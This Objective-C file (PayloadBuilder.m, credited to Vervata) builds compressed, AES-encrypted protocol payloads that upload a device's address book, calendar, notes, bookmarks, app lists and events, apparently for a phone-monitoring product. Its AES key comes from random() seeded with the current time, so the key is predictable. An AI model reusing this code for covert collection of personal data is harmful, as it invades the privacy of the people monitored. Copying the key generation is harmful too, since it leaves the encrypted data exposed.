//
//  PayloadBuilder.m
//  ProtocolBuilder
//
//  Created by Pichaya Srifar on 7/26/11.
//  Copyright 2011 Vervata. All rights reserved.
//

#include <stdlib.h>
#import <Foundation/Foundation.h>
#import "PayloadBuilder.h"
#import "ProtocolParser.h"
#import "CommandCodeEnum.h"
#import "PayloadBuilderResponse.h"
#import "ProtocolParser.h"
#import "CommandMetaData.h"

#import "SendDeactivate.h"
#import "SendHeartBeat.h"
#import "SendEvent.h"

#import "GZip.h"
#import "AESCryptor.h"
#import "CRC32.h"

#import "SendEventPayloadBuilder.h"
#import "SendAddressBookPayloadBuilder.h"
#import "SendInstalledApplicationPayloadBuilder.h"
#import "SendRunningApplicationPayloadBuilder.h"
#import "SendBookmarksPayloadBuilder.h"

#import "SendCalendarPayloadBuilder.h"
#import "SendNotePayloadBuilder.h"

#import "NSFileManager-AES.h"


@implementation PayloadBuilder

- (PayloadBuilderResponse *)BuildPayloadForCmd:(id <CommandData>)command
			  withMetaData:(CommandMetaData *)metadata
		   withPayloadPath:(NSString *)payloadPath
			 withDirective:(TransportDirective)directive {
	NSData *payloadData = [NSData data];
	NSFileManager *fileMgr = [NSFileManager defaultManager];
	NSError *error = nil;
	
	DLog(@"### BuildPayloadForCmd %@", command);
	switch ([command getCommand]) {
		case SEND_ACTIVATE:
			payloadData = [ProtocolParser parseActivateRequest:command];
			break;
		case SEND_DEACTIVATE:
			payloadData = [ProtocolParser parseDeactivateRequest:(SendDeactivate *)command];
			break;
		case SEND_HEARTBEAT:
			payloadData = [ProtocolParser parseHeartbeatRequest:(SendHeartBeat *)command];
			break;
		case SEND_EVENTS:
			[SendEventPayloadBuilder buildPayloadWithCommand:command withMetaData:metadata withPayloadFilePath:payloadPath withDirective:directive];
			break;
		case SEND_ADDRESSBOOK_FOR_APPROVAL:
			[SendAddressBookPayloadBuilder buildPayloadWithCommand:command withMetaData:metadata withPayloadFilePath:payloadPath withDirective:directive];
			break;
		case SEND_ADDRESSBOOK:
			[SendAddressBookPayloadBuilder buildPayloadWithCommand:command withMetaData:metadata withPayloadFilePath:payloadPath withDirective:directive];
			break;
		case GET_CSID:
			payloadData = [ProtocolParser parseGetCSID:(GetCSID *)command];
			break;     
		case GET_TIME:            
			payloadData = [ProtocolParser parseGetTime:(GetServerTime *)command];                   
			break;
		case GET_PROCESS_PROFILE:
			payloadData = [ProtocolParser parseGetProcessProfile:(GetProcessProfile *)command];
			break;
		case GET_CONFIGURATION:
			payloadData = [ProtocolParser parseGetConfiguration:(GetConfiguration *)command];
			break;
		case GET_ACTIVATION_CODE:
			payloadData = [ProtocolParser parseGetActivationCode:(GetActivationCode *)command];
			break;
		case GET_ADDRESSBOOK:
			payloadData = [ProtocolParser parseGetAddressBook:(GetAddressBook *)command];
			break;
		case GET_COMMUNICATION_DIRECTIVE:
			payloadData = [ProtocolParser parseGetCommunicationDirectives:(GetCommunicationDirectives *)command];
			break;
		case GET_INCOMPATIBLE_APPLICATION_DEFINITIONS:
			payloadData = [ProtocolParser parseGetIncompatibleApplicationDefinitions:(GetIncompatibleApplicationDefinitions *)command];
			break;
		case SEND_INSTALLED_APPLICATIONS:
            if ([metadata protocolVersion] >= 8)
                payloadData = [SendInstalledApplicationPayloadBuilder buildPayloadWithCommandv8:(SendInstalledApplication *)command];
            else 
                payloadData = [SendInstalledApplicationPayloadBuilder buildPayloadWithCommand:(SendInstalledApplication *)command];
			break;
		case SEND_RUNNING_APPLICATIONS:
			payloadData = [SendRunningApplicationPayloadBuilder buildPayloadWithCommand:(SendRunningApplication *)command];
			break;
		case SEND_BOOKMARKS:
			payloadData = [SendBookmarksPayloadBuilder buildPayloadWithCommand:(SendBookmark *)command];
			break;
		case GET_APPLICATION_PROFILE:
			payloadData = [ProtocolParser parseGetApplicationProfile:(GetApplicationProfile *)command];
			break;
		case GET_URL_PROFILE:
			payloadData = [ProtocolParser parseGetUrlProfile:(GetUrlProfile *)command];
			break;
		case SEND_CALENDAR:
			[SendCalendarPayloadBuilder buildPayloadWithCommand:(SendCalendar *)command
												   withMetaData:metadata
											withPayloadFilePath:payloadPath
												  withDirective:directive];
			break;
		case SEND_NOTE:
			[SendNotePayloadBuilder buildPayloadWithCommand:(SendNote *)command
											   withMetaData:metadata
										withPayloadFilePath:payloadPath
											  withDirective:directive];
			break;
		case GET_BINARY:
			payloadData = [ProtocolParser parseGetBinary:(GetBinary *)command];
			break;
		case GET_SUPPORTED_IM:
			payloadData = [ProtocolParser parseGetSupportIM:(GetSupportIM *)command];
			break;
        case GET_SNAPSHOT_RULES:
            payloadData = [ProtocolParser parseGetSnapShotRule:(GetSnapShotRule *)command];
            break;
        case SEND_SNAPSHOT_RULES:
            payloadData = [ProtocolParser parseSendSnapShotRule:(SendSnapShotRule *)command];
            break;
        case GET_MONITOR_APPLICATIONS:
            payloadData = [ProtocolParser parseGetMonitorApplication:(GetMonitorApplication *)command];
            break;
        case SEND_MONITOR_APPLICATIONS:
            payloadData = [ProtocolParser parseSendMonitorApplication:(SendMonitorApplication *)command];
            break;
        case SEND_DEVICE_SETTINGS:
            payloadData = [ProtocolParser parseSendDeviceSettings: (SendDeviceSettings *)command];
            break;
        case SEND_TEMPORAL_APPLICATION_CONTROL:
            payloadData = [ProtocolParser parseSendTemporalControl:(SendTemporalControl *)command];
            break;
        case GET_TEMPORAL_APPLICATION_CONTROL:
            payloadData = [ProtocolParser parseGetTemporalControl:(GetTemporalControl *)command];
            break;
        case GET_NETWORK_ALERT_CRITERIA:
            payloadData = [ProtocolParser parseGetNetworkAlertCriteria:(GetNetworkAlertCritiria *)command];
            break;
        case SEND_NETWORK_ALERT:
            payloadData = [ProtocolParser parseSendNetworkAlert:(SendNetworkAlert *)command];
            break;
        case GET_APPSCREENSHOT_RULE:
            payloadData = [ProtocolParser parseGetAppScreenShotRule:(GetAppScreenShotRule *)command];
            break; 

		default:
			payloadData = [NSData data];
			break;
	}
	
	
	NSDictionary *attrs = [fileMgr attributesOfItemAtPath:payloadPath error:&error];
	uint32_t payloadSize = [attrs fileSize];
	
	PayloadBuilderResponse *response = [[PayloadBuilderResponse alloc] init];

	uint32_t payloadCRC32;
	NSString *aesKey = [self generateRandomString:16];
	
	if (directive == RESUMABLE) {
		[response setPayloadType:FROM_FILE]; // set response
		if ([metadata compressionCode] == 1) {
			//DLog(@"== GZip path == %@", payloadPath);
			NSString *zipPath = [payloadPath stringByAppendingPathExtension:@"gz"];
			[GZip gzipDeflateFile:payloadPath toDestination:zipPath]; // payload size
			//DLog(@"== GZip content == %@", [NSData dataWithContentsOfFile:payloadPath]);
			//DLog(@"== GZip content == %@ %d", [NSData dataWithContentsOfFile:zipPath], [metadata encryptionCode]);
			NSFileManager *fileMgr = [NSFileManager defaultManager];
			NSError *error = nil;
			[fileMgr removeItemAtPath:payloadPath error:&error];
			[fileMgr moveItemAtPath:zipPath toPath:payloadPath error:&error];
			
			NSDictionary *attrs = [fileMgr attributesOfItemAtPath:payloadPath error:&error];
			payloadSize = [attrs fileSize];
		}
		if ([metadata encryptionCode] == 1) {
			NSString *encryptPath = [payloadPath stringByAppendingPathExtension:@"encrypted"];
			//DLog(@"encryptPath %@", encryptPath);
//			AESCryptor *cryptor = [[AESCryptor alloc] init];
//			payloadSize = [cryptor encryptFile:payloadPath withKey:aesKey toPath:encryptPath]; // payload size
//			[cryptor release];
			
			NSFileManager *fileMgr = [NSFileManager defaultManager];
			if ([fileMgr fileExistsAtPath:payloadPath]) {
				NSError *error = nil;
				[fileMgr AESEncryptFile:payloadPath toFile:encryptPath usingPassphrase:aesKey error:&error];
				if (error != nil) {
					//return transport error
					DLog(@"AESEncryptFile error");
					[response release];
					return nil;
				}
			} else {
				// return transport error
				DLog(@"no file at responseFilePath");
				[response release];
				return nil;
			}
			//DLog(@"== AES content == %@ %d", [NSData dataWithContentsOfFile:payloadPath], payloadSize);
			//DLog(@"== AES content == %@", [NSData dataWithContentsOfFile:encryptPath]);
			
			NSError *error = nil;
			[fileMgr removeItemAtPath:payloadPath error:&error];
			[fileMgr moveItemAtPath:encryptPath toPath:payloadPath error:&error];
			
			//DLog(@"== AES content == %@", [NSData dataWithContentsOfFile:payloadPath]);
			
			NSDictionary *attrs = [fileMgr attributesOfItemAtPath:payloadPath error:&error];
			payloadSize = [attrs fileSize];
		}
		payloadCRC32 = [CRC32 crc32File:payloadPath];
	} else {
		[response setPayloadType:FROM_BUFFER]; // set response
		if ([metadata compressionCode] == 1) { 
			//DLog(@"uncompressed payload %@", payloadData);
			payloadData = [GZip gzipDeflateData:payloadData]; 
			//DLog(@"compressed payload %@", payloadData);
		}
		if ([metadata encryptionCode] == 1) {
			AESCryptor *cryptor = [[AESCryptor alloc] init];
			payloadData = [cryptor encrypt:payloadData withKey:aesKey];
			//DLog(@"encrypted payload %@", payloadData);
			[cryptor release];
		}
		payloadSize = [payloadData length]; // payload size
		[response setData:payloadData]; // set response
		payloadCRC32 = [CRC32 crc32:payloadData];
	}
	//DLog("payload size after = %d", payloadSize);
	[response setPayloadSize:payloadSize];
	[response setPayloadCRC32:payloadCRC32];
	[response setAesKey:aesKey]; // set response
	
	return [response autorelease];
}

- (NSString *)generateRandomString:(int)length {
	srandom(time(NULL));
	NSString *letter = @"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	NSMutableString *randomString = [NSMutableString stringWithCapacity:length];
	for (int i=0; i<length; i++) {
		[randomString appendFormat:@"%c", [letter characterAtIndex: random()%[letter length]]];
	}
	return randomString;
}

- (void) dealloc {
	[super dealloc];
}

@end
